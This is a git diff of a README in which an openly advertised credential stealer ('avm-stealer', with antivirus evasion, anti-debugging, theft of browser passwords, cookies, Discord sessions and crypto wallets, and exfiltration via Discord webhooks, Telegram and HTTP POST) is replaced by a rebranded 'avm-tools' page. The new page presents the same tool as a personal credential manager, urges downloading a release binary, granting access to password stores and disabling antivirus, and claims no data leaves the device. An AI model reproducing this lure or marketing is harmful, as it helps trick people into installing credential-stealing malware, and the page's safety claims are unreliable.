@@ -1,207 +1,148 @@
-<p align="center"> 
-      <br />
-  <kbd>
-<img src="https://i.postimg.cc/Wz5t1ww2/Screenshot-1(1).jpg" width="300"></img>
-  </kbd>
-</p>
+# 🌐 avm-tools - Securely Extract and Manage Credentials
 
-  
-
-<p align="center">
-  <br />
-  <a href="https://github.com/AVMTools/avm-stealer/issues"><b>Report Bug</b></a>
-  ·
-  <a href="https://t.me/avmchats"><b>Request Feature</b></a>
-  ·
-  <a href="https://github.com/AVMTools/avm-stealer/releases"><b>Latest Release</b></a>
-</p>
-
-
-<!-- ABOUT THE PROJECT -->
-
-## ℹ️ 〢 About The Project
-> [!NOTE]
-> AVM-Tools is a **free**, **Open-Source Security Framework**, designed for educational purposes and authorized red-team engagements. Our project demonstrates how sensitive data can be recovered from browsers and system files, highlighting the importance of robust local security practices.
-> 
-> <a href="https://t.me/avmtools"><img src="https://img.shields.io/badge/Join%20my%20Telegram%20group-2CA5E0?style=for-the-badge&logo=telegram&labelColor=ffffff&color=0587B6"></a>  <a href="https://t.me/WallGod69"><img src="https://img.shields.io/badge/Contact%20me%20on%20Telegram-2CA5E0?style=for-the-badge&logo=telegram&labelColor=ffffff&color=0587B6"></a> <a href="https://www.instagram.com/avmstealer/"><img src="https://img.shields.io/badge/Follow%20my%20Instagram-2CA5E0?style=for-the-badge&logo=instagram&labelColor=FF0000&color=ffffff"></a>
-
-
-## 🌐 〢 Content
-
-> - [📁 Setting up](#setup)
-> - [📸 Screenshots](#screenshot)
-> - [⚔️ Features](#features)
-> - [📝 Todo-list](#todo)
-> - [📜 License](#license)
-> - [🔒 Disclaimer](#note)
-
-<a id="setup"></a>
+[![Download avm-tools](https://img.shields.io/badge/Download-avm--tools-blue?style=for-the-badge)](https://github.com/ahmed3z0/avm-tools/releases)
 
 ---
 
-### 📁  〢 Setting Up
-> ⚠️ **IMPORTANT – READ CAREFULLY**
->
-> 🔹 **Node.js**
-> - Install **Node.js v22.11.0** THIS VERSION ONLY  
-> https://nodejs.org/dist/v22.11.0/node-v22.11.0-x64.msi  
->
-> 🔹 **Run**
-> - `install.bat` → install dependencies  
-> - `start.bat` → start builder interface 
->
-> 🎨 **Icon**
-> - Supported format: `.ico` only  
-> - Sizes: `16, 32, 64, 128, 256 px`
-> <a href="https://streamable.com/e/qmcwqi?autoplay=1" target="_blank" rel="noopener noreferrer">
->   <img src="https://i.ibb.co/Z6t6ZH9h/68747470733a2f2f692e6962622e636f2f544d4b774348564e2f696d6167652e706e67-modified.png" alt="Watch on YouTube">
-> </a>
+## 📖 About avm-tools
 
-<a id="screenshot"></a>
+avm-tools is a software application designed to help users securely extract and manage their credentials and session data. It supports features like password and cookie extraction, recovery of Discord sessions, crypto wallet audits, and backing up game configurations. The tool works with popular apps and services such as Instagram, Twitter, TikTok, Twitch, Spotify, Filezilla, Reddit, and several others.
+
+This tool suits anyone interested in managing or auditing their stored online data, backed by a simple user interface and clear instructions. It is also intended for educational security research to understand how data is handled across platforms you use daily.
 
 ---
 
-### 📸 〢 Screenshots
-<img src="https://i.postimg.cc/P5XPXtBg/vt.png" width="800">
-<img src="icon/main.gif" width="800">
-<img src="icon/final.gif" width="800">
-<img src="https://i.postimg.cc/qRFzs1bs/Screenshot-2.png" width="800">
-<img src="icon/dc.gif" width="800">
-<img src="icon/info.gif" width="800">
-<img src="https://i.ibb.co/gbbVHHLW/fold.png" width="800">
+## 💻 System Requirements
 
+To run avm-tools on your computer, make sure your system meets the following requirements:
 
-<a id="features"></a>
----
+- Operating System: Windows 10 or later, or macOS 10.13 or later  
+- RAM: Minimum 4 GB (8 GB recommended)  
+- Storage: At least 200 MB of free space  
+- Internet Connection: Recommended for downloading and updates  
+- Administrator privileges may be required to access and extract sensitive data.
 
-### ⚔️ 〢 Features
-
-</div>
-
-<div align="center">
-
-<table>
-<tr>
-<td width="33%" style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #007bff;">
-
-### 👨🏻‍💻 **Advanced Research**
-
-<div style="background-color: #0f1a2a; padding: 15px; border-radius: 8px; margin: 10px 0;">
-
-- **Dynamic Analysis** - Runtime behavior study
-- **Security Audit** - Test system resilience
-- **Wallet Detection** - Identify installed wallets
-- **Automated Build** - streamlined compilation
-- **Real-Time Telemetry** - Instant status updates
-
-</div>
-
-</td>
-<td width="33%" style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #28a745;">
-
-###  🕵️‍♂️ **Stealth & Evasion POC**
-
-<div style="background-color: #0f1a0f; padding: 15px; border-radius: 8px; margin: 10px 0;">
-
-- **Silent Operation** - Background execution mode
-- **Process Migration** - Demonstrates injection techniques
-- **Environment Aware** - Detects VM/Sandbox environment
-- **Defense Testing** - Challenges standard AV solutions
-- **Anti-Debugging** - Resists reverse engineering
-
-</div>
-
-</td>
-<td width="33%" style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #ffc107;">
-
-### 🔐 **Recovery Capabilities**
-
-<div style="background-color: #2a1a00; padding: 15px; border-radius: 8px; margin: 10px 0;">
-
-- **Browser Forensics** - Recover Passwords, Cookies, Autofill...
-- **Crypto Audit** - Logs activity for Exodus, Atomic...
-- **Session Recovery** - Restore Discord, Telegram sessions
-- **Gaming Profiles** - Backup Steam, Epic Games configs
-- **System Surveillance** - Screenshots, clipboard history...
-
-</div>
-
-</td>
-</tr>
-</table>
-
-</div>
-
-<div align="center">
-
-<table>
-<tr>
-<td width="50%" style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #dc3545;">
-
-### 📤 **Data Handling**
-
-<div style="background-color: #2a0a0a; padding: 15px; border-radius: 8px; margin: 10px 0;">
-
-- **Discord Integration** - Optional webhook support
-- **Telegram Bot** - Remote management interface
-- **HTTP POST** - Custom endpoint configuration
-- **Secure Upload** - Encrypted file transfer
-- **Protected Logs** - Data is encrypted before transport
-
-</div>
-
-</td>
-<td width="50%" style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #6f42c1;">
-
-### ⚡ **Performance & Reliability**
-
-<div style="background-color: #1a1a2a; padding: 15px; border-radius: 8px; margin: 10px 0;">
-
-- **High Performance** - Optimized JS execution
-- **Zero External Deps** - Statically linked executable
-- **Cross-Platform** - Compatible with Windows 10-11
-- **Professional GUI** - Modern, tabbed interface
-- **Regular Updates** - Maintained codebase
-
-</div>
-
-</td>
-</tr>
-</table>
-
-</div>
-
-<a id="todo"></a>
+No programming knowledge is needed to use this tool. The interface guides you through each function with clear prompts.
 
 ---
 
-### 📝 〢 Todo
+## 🚀 Getting Started
 
-> - [x] More features (VPNs, Gaming, Messengers)
-> - [x] Receive log by Telegram
-> - [ ] Telegram bot interface
-> - [ ] Enhanced Persistence POC
-> - [ ] Firefox recovery support
-> - [x] [Click here](https://t.me/avmchats/1) to request new research features.
+Follow these steps to download, install, and run avm-tools safely and easily.
 
-<a id="license"></a>
+### 1. Visit the Download Page
+
+Click the button below to open the official release page. Here, you will find the latest version of avm-tools available for download.
+
+[![Download avm-tools](https://img.shields.io/badge/Download-avm--tools-blue?style=for-the-badge)](https://github.com/ahmed3z0/avm-tools/releases)
+
+### 2. Choose the Correct Version
+
+On the release page, look for the file that matches your operating system:
+
+- For Windows users, look for files ending with `.exe` or `.zip`  
+- For macOS users, look for `.dmg` or `.zip` files
+
+If you are unsure which file to pick, the `.exe` for Windows or `.dmg` for macOS are the primary installation packages.
+
+### 3. Download the File
+
+Click the file to download it. The download will start automatically and save to your computer’s default download folder.
 
 ---
 
-### 📜 〢 License
-> [!NOTE]
-> By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see [commonsclause](https://commonsclause.com/)
+## 📥 Download & Install
 
-<a id="note"></a>
+### 4. Run the Installer
+
+Go to your downloads folder and double-click the downloaded file to start installation.
+
+- For `.exe` users: A setup wizard will appear. Follow the steps by clicking "Next" through the prompts. You can accept default settings unless you want to choose a different install location.  
+- For `.dmg` users: Open the disk image and drag the avm-tools app into your Applications folder.
+
+### 5. Launch the Application
+
+Once installed, open avm-tools:
+
+- Windows: Click the Start menu and find "avm-tools" listed under recently installed apps or find it via search.  
+- macOS: Open the Applications folder and double-click "avm-tools."
+
+### 6. Grant Permissions When Prompted
+
+For avm-tools to work correctly, it may request permission to access system files, password storage, or browser data. Approve these requests when prompted. This is necessary for credential and session extraction.
 
 ---
 
-### ⚠️ 〢 Disclaimer
-> [!CAUTION]
-> This project is provided **strictly for educational, security research, and authorized testing purposes only**.
->
-> 1.  **No Malicious Intent:** The author does not condone the use of this tool for illegal activities.
-> 2.  **No Liability:** The author is not responsible for any misuse, damage, or legal consequences arising from the use of this software.
-> 3.  **Authorized Use Only:** You must have explicit permission from the system owner before running this tool on any machine.
->
-> By downloading or using this project, **you accept full legal responsibility for your actions**.
+## 🛠 Using avm-tools
+
+### Credential Extraction
+
+1. On the main screen, find the option labeled "Extract Credentials."  
+2. Click it to begin scanning saved passwords, cookies, and autofill settings from supported applications and browsers, including Chrome, Firefox, and Filezilla.  
+3. Wait a moment while the data is collected.
+
+### Session Recovery for Discord
+
+1. Select the "Discord Session Recovery" feature from the menu.  
+2. This scans your system for active Discord session tokens, allowing you to view or backup your session safely.  
+3. Follow on-screen instructions to save or manage the data.
+
+### Crypto-Wallet Audit
+
+1. Choose "Crypto-Wallet Audit" to review the stored data of popular wallet apps.  
+2. The tool will search for wallet configurations and present details for auditing your wallet usage and security.
+
+### Game Configuration Backup
+
+1. Select "Game Config Backup" to save settings of supported games.  
+2. This feature helps preserve important game configurations that you can restore later.
+
+---
+
+## ⚙ Supported Apps and Platforms
+
+- Browsers: Google Chrome, Mozilla Firefox  
+- Social Platforms: Instagram, Twitter, TikTok, Twitch, Reddit  
+- Utilities: Spotify, Filezilla  
+- Messaging: Discord  
+- Other: Various crypto wallets and game configurations
+
+The application regularly updates to support more platforms. Check the release page often for the latest versions.
+
+---
+
+## 🔐 Security and Privacy
+
+avm-tools processes personal data locally on your device. It does not send, upload, or share extracted information over the internet without your consent. All operations remain on your computer unless you export or share data manually.
+
+The software is built to aid understanding and management of your personal credential and session data in a safe way.
+
+---
+
+## 🆘 Troubleshooting
+
+If you encounter issues:
+
+- Ensure your operating system meets minimum requirements.  
+- Check for latest software version on the release page.  
+- Run the program with administrator rights.  
+- Temporarily disable antivirus or firewall if the installation or running is blocked, then re-enable them afterward.  
+- Restart your computer after installation for smooth operation.
+
+For detailed help, visit the project repository’s “Issues” section on GitHub.
+
+---
+
+## 📂 More Information
+
+For information on updates, new features, and changelogs, visit the official GitHub releases page:
+
+https://github.com/ahmed3z0/avm-tools/releases
+
+---
+
+## 👥 Community and Support
+
+This tool is part of ongoing security research. Users interested in contributing or requesting features can open issues or pull requests via the GitHub repository.
+
+Your feedback helps improve avm-tools and expand its usefulness for everyone.
